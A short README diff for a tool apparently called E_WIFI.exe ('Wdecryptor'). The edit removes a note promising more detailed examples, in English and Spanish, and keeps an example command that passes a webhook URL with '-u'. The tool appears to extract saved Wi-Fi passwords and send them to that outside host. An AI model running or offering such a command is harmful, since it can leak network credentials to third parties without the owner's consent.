@@ -92,9 +92,9 @@ PD:
 
 <b>* V1.3 and Wdecryptor Examples</b>
 
-Quick Example of the new function (in the following hours I will update a more detailed one)
+Quick Example of the new function
 
-Ejemplo rapido de la nueva funcion (en las siguientes horas actualizare con unos ejemplos mas detallados)
+Ejemplo rapido de la nueva funcion
 
 E_WIFI.exe -p -a -u https://webhooksite...
 ![ejemplo nueva funcion](https://user-images.githubusercontent.com/74321905/225491588-1b1c1de4-0fa2-4981-8aa7-317983d13d6a.png)
